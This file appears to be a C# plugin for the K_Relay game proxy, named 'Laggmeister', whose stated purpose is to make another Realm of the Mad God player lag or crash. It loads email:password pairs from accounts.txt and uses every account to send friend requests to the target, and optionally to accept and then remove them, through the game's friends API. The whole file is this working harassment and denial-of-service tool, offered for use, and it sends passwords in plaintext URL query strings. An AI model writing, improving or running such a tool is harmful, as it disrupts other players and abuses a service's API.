using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Lib_K_Relay;
using Lib_K_Relay.Utilities;
using Lib_K_Relay.Interface;
using Lib_K_Relay.Networking;
using Lib_K_Relay.Networking.Packets;
using Lib_K_Relay.Networking.Packets.Client;
using Lib_K_Relay.Networking.Packets.Server;
using Lib_K_Relay.Networking.Packets.DataObjects;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Security.Cryptography.X509Certificates;

namespace laggymeister
{
    public class Class1: IPlugin
    {
		private bool _enabled = true;

		public string GetAuthor()
		{ return "x34"; }

		public string GetName()
		{ return "Laggmeister"; }

		public string GetDescription()
		{ return "This plugin lets you lag or crash depending on your account size"; }

		public string[] GetCommands()
		{ return new string[] { "null" }; }

		public void Initialize(Proxy proxy)
		{
			proxy.HookCommand("lm", OnMyPluginCommand);
			proxy.HookPacket(PacketType.PLAYERTEXT, OnPlayerText);
		}

		private void OnMyPluginCommand(Client client, string command, string[] args)
		{
			if (args.Length == 0) return;

			if (args[0] == "enable") _enabled = true;
			if (args[0] == "disable") _enabled = false;

			var clientee = new WebClient();
			string target = args[1];

			if (File.Exists("accounts.txt"))
			{
				string fileName = "accounts.txt";
				var lines = File.ReadLines(fileName);
				foreach (var line in lines)
				{
					string email = line.Substring(0, line.IndexOf(":"));
					string password = line.Substring(line.IndexOf(":") + 1);
					var main = clientee.DownloadString("https://realmofthemadgodhrd.appspot.com/friends/requestFriend?guid=" + email + "&targetName=" + target + "&password=" + password + "&do_login=true");
					if (args[2] == "true")
					{
						var remain = clientee.DownloadString("https://realmofthemadgodhrd.appspot.com/friends/acceptRequest?guid=" + email + "&targetName=" + target + "&password=" + password + "&do_login=true");
						var reremain = clientee.DownloadString("https://realmofthemadgodhrd.appspot.com/friends/removeFriend?guid=" + email + "&targetName=" + target + "&password=" + password + "&do_login=true");
					}
				}
			}
            else
            {
				MessageBox.Show("Error: 'accounts.txt' file not found!");
            }
		}

		private void OnPlayerText(Client client, Packet packet)
		{
			if (!_enabled) return;
		}
	}
}
